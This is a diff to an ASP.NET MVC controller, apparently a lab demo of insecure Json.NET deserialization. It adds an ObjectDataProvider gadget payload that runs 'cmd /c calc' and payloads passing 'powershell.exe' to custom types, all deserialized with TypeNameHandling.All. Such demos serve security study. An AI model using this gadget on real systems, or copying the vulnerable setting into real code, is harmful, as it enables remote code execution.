@@ -1,5 +1,4 @@
-﻿using System.Diagnostics;
-using System.Web.Mvc;
+﻿using System.Web.Mvc;
 using mvcapp.Models;
 using Newtonsoft.Json;
 
@@ -28,7 +27,7 @@ namespace mvcapp.Controllers
                 Value = "Some test string 2."
             };
 
-            //var complex = new Complex("powershell.exe")
+            //var complex = new ComplexConstructor("powershell.exe")
             //{
             //    ID = 3,
             //};
@@ -41,9 +40,23 @@ namespace mvcapp.Controllers
 
             //{"$type":"mvcapp.Models.Simple, mvcapp","ID":1,"Value":"Some test string."}
             //{"$type":"mvcapp.Models.Simple, mvcapp","ID":1,"Value":{"$type":"mvcapp.Models.Simple, mvcapp","ID":2,"Value":"Some test string 2."}}
-            //{"$type":"mvcapp.Models.Complex, mvcapp","ID":3,"Parameters":"powershell.exe"}
+            //{"$type":"mvcapp.Models.ComplexConstructor, mvcapp","ID":3,"Parameters":"powershell.exe"}
 
-            string payload = "{\"$type\":\"mvcapp.Models.Simple, mvcapp\",\"ID\":1,\"Value\":{\"$type\":\"mvcapp.Models.Complex, mvcapp\",\"ID\":2,\"Parameters\":\"powershell.exe\"}}";
+            string payloadWithComplexConstructor = "{\"$type\":\"mvcapp.Models.Simple, mvcapp\",\"ID\":1,\"Value\":{\"$type\":\"mvcapp.Models.ComplexConstructor, mvcapp\",\"ID\":2,\"Parameters\":\"powershell.exe\"}}";
+            string payloadWithComplexSetter = "{\"$type\":\"mvcapp.Models.Simple, mvcapp\",\"ID\":1,\"Value\":{\"$type\":\"mvcapp.Models.ComplexSetter, mvcapp\",\"ID\":2,\"Parameters\":\"powershell.exe\"}}";
+
+            string objectDataProviderPayload = @"{
+                '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
+                'MethodName':'Start',
+                'MethodParameters':{
+                    '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
+                    '$values':['cmd','/ccalc']
+                },
+                'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
+            }";
+
+            string payloadWithObjectDataProviderPayload ="{\"$type\":\"mvcapp.Models.Simple, mvcapp\",\"ID\":1,\"Value\":"+ objectDataProviderPayload +"}";
+
 
             var deserializeSimpleObject = JsonConvert.DeserializeObject(serializedSimple);
 
@@ -53,7 +66,19 @@ namespace mvcapp.Controllers
                     TypeNameHandling = TypeNameHandling.All
                 });
 
-            var deserializeComplexObjectWithTypeNameHandlingAll = JsonConvert.DeserializeObject(payload, new
+            var deserializePayloadWithObjectDataProviderPayload = JsonConvert.DeserializeObject(payloadWithObjectDataProviderPayload, new
+                JsonSerializerSettings
+                {
+                    TypeNameHandling = TypeNameHandling.All
+                });
+
+            var deserializeComplexConstructorObjectWithTypeNameHandlingAll = JsonConvert.DeserializeObject(payloadWithComplexConstructor, new
+                JsonSerializerSettings
+                {
+                    TypeNameHandling = TypeNameHandling.All
+                });
+
+            var deserializeComplexSetterObjectWithTypeNameHandlingAll = JsonConvert.DeserializeObject(payloadWithComplexSetter, new
                 JsonSerializerSettings
                 {
                     TypeNameHandling = TypeNameHandling.All
